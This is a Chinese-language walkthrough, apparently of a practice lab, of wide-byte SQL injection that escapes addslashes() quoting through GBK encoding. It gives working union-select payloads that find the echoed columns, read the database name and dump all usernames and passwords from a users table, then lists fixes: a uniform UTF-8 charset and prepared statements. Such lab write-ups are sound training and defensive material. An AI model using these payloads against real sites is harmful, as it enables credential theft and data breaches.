## 一、靶场信息
- **漏洞类型**：宽字节注入（Wide Byte Injection）。
- **防御机制**：后台使用 `addslashes()` 等函数对单引号进行了转义（变成 `\'`）。
- **通关思路**：利用数据库 GBK 编码的特性，传入 `%df` 与转义生成的反斜杠 `%5c` 结合成一个汉字，从而“吃掉”反斜杠，让单引号成功逃逸。

## 二、核心绕过思路（大白话解析）

这关的“锁孔”其实还是单引号，但后台防得很死，只要看到单引号，就强行在前面加个反斜杠（`\`）把它捆住。

**怎么破？**
咱们利用 MySQL 数据库（通常是 GBK 编码）的“贪吃”特性。在 GBK 里，两个字节拼在一起才算一个汉字。咱们输入 `%df'`，后台转义后变成 `%df%5c%27`。数据库一解析，`%df%5c` 拼成了一个合法的汉字“運”，后面的单引号 `%27` 就彻底解放了！

## 三、详细操作步骤与 Payload 解析

### 第一步：探测回显点

**Payload：**
```text
?id=-1%df' union select 1,2,3 --+
```

**回显现象：**
页面显示数字 `2` 和 `3`，确认存在 3 列回显。

**大白话解析：**
*   **`-1%df'`**：`-1` 让原查询落空，`%df` 和转义的反斜杠结合吃掉限制，最后的 `'` 成功闭合后台语法。
*   **`union select 1,2,3`**：经典的联合查询，强行让数据库多返回三列。
*   **`--+`**：注释符，把后台原本跟着的 `LIMIT 0,1` 注释掉。

### 第二步：爆当前数据库名

**Payload：**
```text
?id=-1%df' union select 1,database(),3 --+
```

**回显现象：**
页面 `Your Login name:` 后面显示 `security`。

**大白话解析：**
*   利用第 2 列回显位，把数字 `2` 替换成 `database()` 函数，直接把库名喊出来。

### 第三步：终极脱库（提取账号密码）

**Payload：**
```text
?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users --+
```

**回显现象：**
页面成功爆出所有账号密码，如 `Dumb:Dumb,Angelina...`。

**大白话解析：**
*   这一步其实我们“偷懒”跳过了查表名和字段名。因为靶场通常使用最标准的命名（`users` 表，`username`/`password` 字段），我们直接去查，一击命中。
*   **`group_concat(username,0x3a,password)`**：把多行账号密码打包成一行，用冒号（`0x3a`）拼接显示。

## 四、核心防御机制（Remediation）
- **统一字符集**：将数据库和 Web 应用的字符集统一设置为 `UTF-8`，彻底杜绝宽字节注入的发生。
- **预编译语句（PDO/MySQLi）**：使用参数化查询，彻底隔离代码与数据。
